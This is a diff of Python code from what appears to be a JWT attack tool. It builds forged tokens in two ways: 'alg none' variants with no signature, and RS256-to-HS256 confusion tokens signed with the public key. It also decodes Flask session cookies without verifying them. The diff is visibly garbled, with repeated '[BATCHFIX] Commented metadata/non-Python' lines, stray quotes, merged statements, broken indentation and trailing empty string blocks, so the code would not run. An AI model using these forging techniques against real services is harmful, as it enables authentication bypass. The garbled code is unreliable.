@@ -71,38 +71,38 @@ header_b64, payload_b64, signature_b64 = parts
             # Handle padding
             def b64_decode(s):
                 return base64.urlsafe_b64decode(s + "=" * (4 - len(s) % 4))
-            header_json = json.loads(b64_decode(header_b64).decode())
-            _ = header_json  # Mark as used via variable
-        except Exception:
-# [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python"""
-# [BATCHFIX] Commented metadata/non-Python
+                header_json = json.loads(b64_decode(header_b64).decode())
+                _ = header_json  # Mark as used via variable
+                except Exception:
+                # [BATCHFIX] Commented metadata/non-Python
+                """ [BATCHFIX] Commented metadata/non-Python"""
+                # [BATCHFIX] Commented metadata/non-Python
 """
-return []""""
-# [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python"""
-# [BATCHFIX] Commented metadata/non-Python
+                return []""""
+                # [BATCHFIX] Commented metadata/non-Python
+                """ [BATCHFIX] Commented metadata/non-Python"""
+                # [BATCHFIX] Commented metadata/non-Python
 """
-attacks = []""""
-        # 1. Algorithm 'none''# [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python"""
-# [BATCHFIX] Commented metadata/non-Python
+                attacks = []""""
+                # 1. Algorithm 'none''# [BATCHFIX] Commented metadata/non-Python
+                """ [BATCHFIX] Commented metadata/non-Python"""
+                # [BATCHFIX] Commented metadata/non-Python
 """
-none_headers = [{"alg": "none", "typ": "JWT"}, {"alg": "None", "typ": "JWT"}, {"alg": "nOnE", "typ": "JWT"}]"        for nh in none_headers:
-            h_b64 = base64.urlsafe_b64encode(json.dumps(nh).encode()).decode().rstrip("=")"            attacks.append(f"{h_b64}.{payload_b64}.")"
-        # 2. RS256 to HS256 Confusion
-        if public_key:
-            # If we have the public key, we use it as the HMAC secret
-            secret = public_key.encode()
-            hs_header = {"alg": "HS256", "typ": "JWT"}"            h_b64 = base64.urlsafe_b64encode(json.dumps(hs_header).encode()).decode().rstrip("=")"
-            signing_input = f"{h_b64}.{payload_b64}".encode()"            sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
-            sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip("=")"            attacks.append(f"{h_b64}.{payload_b64}.{sig_b64}")"
-        return attacks
+                none_headers = [{"alg": "none", "typ": "JWT"}, {"alg": "None", "typ": "JWT"}, {"alg": "nOnE", "typ": "JWT"}]"        for nh in none_headers:
+                h_b64 = base64.urlsafe_b64encode(json.dumps(nh).encode()).decode().rstrip("=")"            attacks.append(f"{h_b64}.{payload_b64}.")"
+                # 2. RS256 to HS256 Confusion
+                if public_key:
+                # If we have the public key, we use it as the HMAC secret
+                secret = public_key.encode()
+                hs_header = {"alg": "HS256", "typ": "JWT"}"            h_b64 = base64.urlsafe_b64encode(json.dumps(hs_header).encode()).decode().rstrip("=")"
+                signing_input = f"{h_b64}.{payload_b64}".encode()"            sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
+                sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip("=")"            attacks.append(f"{h_b64}.{payload_b64}.{sig_b64}")"
+                return attacks
 
-    @classmethod
-# [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python"""
-# [BATCHFIX] Commented metadata/non-Python
+                @classmethod
+                # [BATCHFIX] Commented metadata/non-Python
+                """ [BATCHFIX] Commented metadata/non-Python"""
+                # [BATCHFIX] Commented metadata/non-Python
 """
 def decode_flask_cookie(cls, cookie: str) -> Optional[Dict]:"Decodes the payload part of a Flask session cookie without verification.        try:
             # Flask cookies are serialized with itsdangerous (base64 of json)
@@ -123,6 +123,24 @@ payload = parts[0] if not cookie.startswith(".") else parts[1]
 
 """
 
-""
+"""
+
+"""
+
+"""
+
+"""
+
+"""
+
+"""
+
+"""
+
+"""
+
+"""
+
+"""
 
 """
